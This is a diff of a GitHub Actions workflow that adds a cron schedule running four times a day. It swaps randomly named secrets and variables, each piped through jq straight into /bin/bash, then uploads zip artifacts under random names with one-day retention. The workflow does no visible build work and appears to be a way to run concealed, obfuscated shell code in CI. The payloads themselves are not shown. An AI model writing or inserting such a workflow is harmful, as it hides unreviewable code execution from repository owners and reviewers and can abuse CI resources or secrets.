@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '47 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,16 +16,15 @@ jobs:
         uses: actions/checkout@v4
       - name: Bootstrap
         env:
-          gyaoi0: ${{ secrets.gyaoi0 }}
+          sd4: ${{ secrets.sd4 }}
         run: |
-          printf '%s' "$gyaoi0" | jq -r .qcsj2 | /bin/bash
-          echo $eovu1817 | jq -r .gmsy57 | /bin/bash
-          printf '%s' "$vuan2" | jq -r .ovqi847 | /bin/bash
-          echo $s14 | jq -r .kky17135 | /bin/bash
+          printf '%s' "$sd4" | jq -r .jod99577 | /bin/bash
+          printf '%s' "$rlrft60021" | jq -r .nmlge12033 | /bin/bash
+          echo $zjezf4323 | jq -r .tpd72402 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
         with:
-          name: yuoIY3jy
+          name: oxtqwF3b
           path: "*.zip"
           retention-days: 1
